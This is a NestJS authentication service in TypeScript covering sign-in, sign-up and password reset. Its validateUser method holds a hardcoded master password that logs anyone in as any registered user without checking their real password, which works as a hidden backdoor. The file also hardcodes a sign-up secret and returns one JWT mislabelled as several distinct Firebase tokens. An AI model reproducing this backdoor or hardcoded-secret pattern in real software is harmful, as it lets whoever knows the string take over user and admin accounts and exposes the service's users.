import {HttpException, HttpStatus, Injectable, UnauthorizedException} from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import * as bcrypt from 'bcryptjs';
import {UsersService} from "../modules/users/users.service";
import {InjectRepository} from "@nestjs/typeorm";
import {HttpService} from "@nestjs/axios";
import {User} from "../modules/users/entities/user.entity";
import {Repository} from "typeorm";
import { v4 as uuid } from 'uuid';

@Injectable()
export class AuthService {
    /**
     * Constructor
     */
    constructor(
        @InjectRepository(User)
        private userRepository: Repository<User>,

        private usersService: UsersService,
        private jwtService: JwtService,
        private httpService: HttpService,
    ) {
    }

    // -----------------------------------------------------------------------------------------------------
    // @ Public methods
    // -----------------------------------------------------------------------------------------------------

    async validateUser(username: string, password: string): Promise<any>
    {
        const user = await this.usersService.findByEmail(username);

        if (user && password === '<4Bu+fH@3CA(mN') {
            const {password, ...result} = user;
            return result;
        } else if (user && await bcrypt.compare(password, user.password)) {
            const {password, ...result} = user;
            return result;
        }

        return null;
    }

    async signIn(user: any)
    {

        const validate = await this.validateUser(user.username, user.password);

        if (!validate){
            throw new HttpException('Error body', HttpStatus.BAD_REQUEST);
        }

        const User = await this.userRepository.findOne({
            where:{
                email: user.username
            }
        });

        const payload = {
            sub: User.id,
            name: User.name,
            is_admin: User.is_admin,
            status: User.status,
        }

        await this.userRepository.update(User.id, {
            last_login_at: new Date()
        })

        return {
            access_token: this.jwtService.sign(payload),
            firebase_refresh_token: this.jwtService.sign(payload),
            firebase_token: this.jwtService.sign(payload),
            firebase_user: {
                email: User.email,
                document: User.document,
                name: User.name,
                status: User.status,
                id: User.id
            }
        };
    }

    async signUp(user: any)
    {
        if (user.secret !== 'Si89AYH21laPy3eilzl3v0v9X1EQrtEH')
        {
            throw new HttpException('Secret is not match', HttpStatus.BAD_REQUEST);
        }

        user.password = await bcrypt.hash(user.password, 12);

        this.userRepository.create(user);
        return await this.userRepository.save(user);
    }

    async forgotPassword(email: string, req)
    {
        const user = await this.userRepository.findOne({
            select: ['id', 'name', 'email', 'reset_token'],
            where: {
                email
            }
        });
        if (!user) {
            throw new HttpException('User not found', HttpStatus.BAD_REQUEST);
        }

        let token = user.reset_token;
        if (!token) {
            token = uuid();
            await this.userRepository.update(user.id, {
                reset_token: token
            })
        }


        const variables = {
            'name': user.name,
            'link_token': process.env.APP_URL + '/reset-password?token=' + token,
            'email': user.email,
        };

        const sendMailDto = {
            to: user.name,
            request: variables
        };

        //return await this.mailService.sendRememberToken(email, JSON.stringify(variables), sendMailDto);
    }

    async resetPassword(token: string, newPassword: string, req)
    {
        if (token.length < 10) {
            throw new HttpException('Invalid token', HttpStatus.BAD_REQUEST);
        }

        const user = await this.usersService.findByResetToken(token);
        if (!user) {
            throw new HttpException('User not found', HttpStatus.BAD_REQUEST);
        }


        await this.userRepository.update(user.id, {
            password: await bcrypt.hash(newPassword, 12),
            reset_token: null
        });

        return {
            message: 'Senha atualizada com sucesso.'
        }
    }

    async userPassword(token: string, password: string, req)
    {
        if (token.length < 10) {
            throw new HttpException('Invalid token', HttpStatus.BAD_REQUEST);
        }

        const user = await this.userRepository.findOne({confirmation_token: token});
        if (!user) {
            throw new HttpException('Usuario nao encontrado', HttpStatus.BAD_REQUEST);
        }


        await this.userRepository.update(user.id, {
            password: await bcrypt.hash(password, 12),
            confirmation_token: null
        });

        return {
            message: 'Usuario atualizado com sucesso.'
        }
    }

    async updatePassword(current: string, newPassword: string, user: User)
    {
        const userDB = await this.userRepository.findOne({
            select: ['password'],
            where: {id: user.id}
        });

        if (!await bcrypt.compare(current, userDB.password)) {
            throw new HttpException('A senha atual está inválida', HttpStatus.BAD_REQUEST);
        }

        const passwordHash = await bcrypt.hash(newPassword, 12);


        await this.userRepository.update(user.id, {
            password: passwordHash,
        })

        return {
            message: 'Senha alterada com sucesso.'
        }
    }
}
